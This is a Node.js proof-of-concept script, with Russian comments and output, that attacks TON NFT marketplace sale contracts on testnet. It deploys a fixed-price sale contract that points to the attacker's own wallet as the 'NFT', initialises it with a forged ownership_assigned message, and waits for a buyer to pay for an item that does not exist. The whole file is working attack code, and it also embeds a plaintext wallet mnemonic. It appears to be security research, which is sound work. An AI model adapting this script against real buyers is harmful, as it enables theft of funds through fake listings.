/**
 * HYP-05: Attacker side only.
 * 1. Deploy fake sale contract (nft_address = attacker.wallet, nft_owner = addr_none)
 * 2. Send ownership_assigned → sale initialized
 * 3. Print sale address → user pays manually via Tonkeeper
 *
 * Run: node 02-fake-nft-listing/poc-attacker-only.js
 */
const { mnemonicToWalletKey } = require('../nft-contracts/node_modules/@ton/crypto');
const {
  WalletContractV4, TonClient, internal, toNano,
  Address, beginCell, contractAddress, Cell
} = require('../nft-contracts/node_modules/@ton/ton');

const client = new TonClient({
  endpoint: 'https://testnet.toncenter.com/api/v2/jsonRPC',
  apiKey: '',
});

const ATTACKER_MNEMONIC = 'asthma black design brick oxygen cat that potato nurse umbrella quote snack bag color walnut jump stem cloth kit sand volcano secret cloth better';

const FULL_PRICE   = toNano('0.05');
const DEPLOY_VALUE = toNano('0.05');
const INIT_VALUE   = toNano('0.12');
const MARKETPLACE_FEE_ADDRESS = Address.parse('EQDDuxx7sa3Dt2GE85a0sIHp4GVoa7OKbAanfo3co9H-h06d');
const OP_OWNERSHIP_ASSIGNED = 0x05138d91;

const NftFixPriceSaleV4R1CodeBoc = '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';
const SALE_CODE_CELL = Cell.fromBase64(NftFixPriceSaleV4R1CodeBoc);

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
function fmt(n) { return (Number(n) / 1e9).toFixed(6); }

async function withRetry(fn, max = 6) {
  for (let i = 1; i <= max; i++) {
    try { return await fn(); } catch (e) {
      if (i < max) { await sleep(e.message?.includes('429') ? 2500 * i : 1200); continue; }
      throw e;
    }
  }
}

function buildSaleDataCell(opts) {
  const feeInt = Math.floor(opts.feePercent * 100_000);
  return beginCell()
    .storeBit(0)
    .storeAddress(opts.marketplaceAddress)
    .storeAddress(null)                   // nft_owner = addr_none → is_initialized=false
    .storeCoins(opts.fullPrice)
    .storeUint(0, 32)
    .storeUint(0, 64)
    .storeRef(beginCell()
      .storeAddress(opts.marketplaceFeeAddress)
      .storeAddress(opts.royaltyAddress)
      .storeUint(feeInt, 17)
      .storeUint(0, 17)
      .storeAddress(opts.nftAddress)
      .storeUint(opts.timestamp, 32)
      .endCell())
    .storeDict(null)
    .storeBit(0)
    .endCell();
}

async function getSaleState(saleAddr) {
  try {
    const r = await withRetry(() => client.runMethod(saleAddr, 'get_fix_price_data_v4'));
    const isCompleteTVM = r.stack.readNumber();
    r.stack.readNumber(); // createdAt
    r.stack.readCell();   // marketplace
    r.stack.readCell();   // nft addr
    const ownerCell = r.stack.readCell();
    const owner = ownerCell.beginParse().loadAddress();
    return {
      isComplete: isCompleteTVM !== 0,
      owner: owner?.toString({ testOnly: true, bounceable: true }) ?? 'addr_none',
    };
  } catch (e) {
    return { error: e.message };
  }
}

async function main() {
  console.log('╔══════════════════════════════════════════════════════════╗');
  console.log('║  HYP-05: Attacker Setup + Wait for Tonkeeper Payment    ║');
  console.log('╚══════════════════════════════════════════════════════════╝\n');

  const atkKey = await mnemonicToWalletKey(ATTACKER_MNEMONIC.split(/\s+/));
  const atkWallet = WalletContractV4.create({ publicKey: atkKey.publicKey, workchain: 0 });

  console.log('[Атакующий wallet (= fake nft_address)]');
  console.log('  ', atkWallet.address.toString({ testOnly: true, bounceable: true }));
  const atkBal = await withRetry(() => client.getContractState(atkWallet.address));
  console.log('  баланс:', fmt(BigInt(atkBal.balance || '0')), 'TON\n');

  // уникальный timestamp → новый адрес контракта при каждом запуске
  const timestamp = Math.floor(Date.now() / 1000);

  const saleData = buildSaleDataCell({
    marketplaceAddress:    atkWallet.address,  // marketplace = attacker
    nftAddress:            atkWallet.address,  // fake nft_address = attacker wallet
    fullPrice:             FULL_PRICE,
    feePercent:            0.025,
    marketplaceFeeAddress: MARKETPLACE_FEE_ADDRESS,
    royaltyAddress:        atkWallet.address,
    timestamp,
  });

  const saleAddr = contractAddress(0, { code: SALE_CODE_CELL, data: saleData });
  const saleTestnet = saleAddr.toString({ bounceable: true, testOnly: true });

  console.log('[1] Деплой sale contract');
  console.log('  Адрес:', saleTestnet);
  console.log('  Цена:  0.05 TON (FULL_PRICE)');

  const existState = await withRetry(() => client.getContractState(saleAddr));
  if (existState.state === 'active') {
    console.log('  [!] Уже задеплоен.');
  } else {
    const atk = client.open(atkWallet);
    const seq1 = await withRetry(() => atk.getSeqno());
    await withRetry(() => atk.sendTransfer({
      seqno: seq1,
      secretKey: atkKey.secretKey,
      messages: [internal({ to: saleAddr, value: DEPLOY_VALUE, bounce: false, init: { code: SALE_CODE_CELL, data: saleData } })],
    }));
    console.log('  TX отправлена, ждём 15s...');
    await sleep(15000);
    const st = await withRetry(() => client.getContractState(saleAddr));
    console.log('  state:', st.state, '| balance:', fmt(BigInt(st.balance || '0')), 'TON');
  }

  // ── Шаг 2: ownership_assigned ──
  console.log('\n[2] ownership_assigned: attacker.wallet → sale contract');
  await sleep(2000);

  const ownAssignedBody = beginCell()
    .storeUint(OP_OWNERSHIP_ASSIGNED, 32)
    .storeUint(0, 64)
    .storeAddress(atkWallet.address)  // prev_owner = attacker (будет сохранён как nft_owner)
    .storeUint(0, 1)
    .endCell();

  const atk = client.open(atkWallet);
  const seq2 = await withRetry(() => atk.getSeqno());
  await withRetry(() => atk.sendTransfer({
    seqno: seq2,
    secretKey: atkKey.secretKey,
    messages: [internal({ to: saleAddr, value: INIT_VALUE, bounce: true, body: ownAssignedBody })],
  }));
  console.log('  TX отправлена, ждём 20s...');
  await sleep(20000);

  const state2 = await getSaleState(saleAddr);
  const isInit = !state2.error && state2.owner !== 'addr_none';
  console.log('  nft_owner:    ', state2.owner);
  console.log('  is_initialized:', isInit ? '✅ TRUE' : '❌ FALSE');

  if (!isInit) {
    console.log('\n  ⚠️  Инициализация не прошла. Стоп.');
    process.exit(1);
  }

  // ── Ждём покупку от пользователя ──
  console.log('\n╔══════════════════════════════════════════════════════════╗');
  console.log('║  ✅ Контракт готов к атаке!                             ║');
  console.log('╠══════════════════════════════════════════════════════════╣');
  console.log('║                                                          ║');
  console.log('║  ДЕЙСТВИЕ: Открой Tonkeeper Testnet                     ║');
  console.log('║  Отправь: 0.07 TON  (FULL_PRICE=0.05 + gas)            ║');
  console.log('║  На адрес:                                              ║');
  console.log('║  ' + saleTestnet.padEnd(56) + '║');
  console.log('║                                                          ║');
  console.log('║  Комментарий: пустой (или любой)                        ║');
  console.log('║                                                          ║');
  console.log('╚══════════════════════════════════════════════════════════╝');
  console.log('\n  Explorer: https://testnet.tonscan.org/address/' + saleAddr.toRawString());
  console.log('\n  Жду покупку... (проверяю каждые 15s, Ctrl+C чтобы стоп)\n');

  // ── Polling ──
  let prevBalance = BigInt((await withRetry(() => client.getContractState(saleAddr))).balance || '0');
  const atkBalBefore = BigInt(atkBal.balance || '0');

  for (let i = 0; i < 60; i++) {
    await sleep(15000);
    const state = await getSaleState(saleAddr);

    if (state.isComplete) {
      const atkBalAfter = (await withRetry(() => client.getContractState(atkWallet.address))).balance;
      const atkDelta = BigInt(atkBalAfter || '0') - atkBalBefore;
      console.log('\n╔══════════════════════════════════════════════════════════╗');
      console.log('║  ✅ HYP-05 ПОДТВЕРЖДЁН!                                 ║');
      console.log('╠══════════════════════════════════════════════════════════╣');
      console.log('║  is_complete = 1                                         ║');
      console.log('║  Атакующий получил: ' + fmt(atkDelta).padEnd(38) + '║');
      console.log('║  Реального NFT не было — покупатель обманут             ║');
      console.log('╚══════════════════════════════════════════════════════════╝');
      console.log('\n  Explorer: https://testnet.tonscan.org/address/' + saleAddr.toRawString());
      process.exit(0);
    }

    const curBal = BigInt((await withRetry(() => client.getContractState(saleAddr))).balance || '0');
    if (curBal !== prevBalance) {
      console.log('  [+] Баланс контракта изменился:', fmt(curBal), 'TON — ждём финализации...');
      prevBalance = curBal;
    } else {
      process.stdout.write('  Ждём... (' + new Date().toLocaleTimeString() + ')\r');
    }
  }

  console.log('\n  [!] Таймаут 15 мин. Проверь вручную:');
  console.log('  https://testnet.tonscan.org/address/' + saleAddr.toRawString());
}

main().catch(e => { console.error('FATAL:', e.message); process.exit(1); });
